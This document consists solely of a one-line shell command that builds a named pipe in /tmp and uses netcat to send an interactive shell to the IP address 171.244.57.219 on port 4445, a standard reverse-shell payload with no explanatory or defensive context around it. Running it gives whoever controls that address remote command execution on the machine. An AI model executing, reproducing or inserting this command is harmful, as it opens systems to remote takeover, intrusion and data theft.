rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 171.244.57.219 4445 >/tmp/f
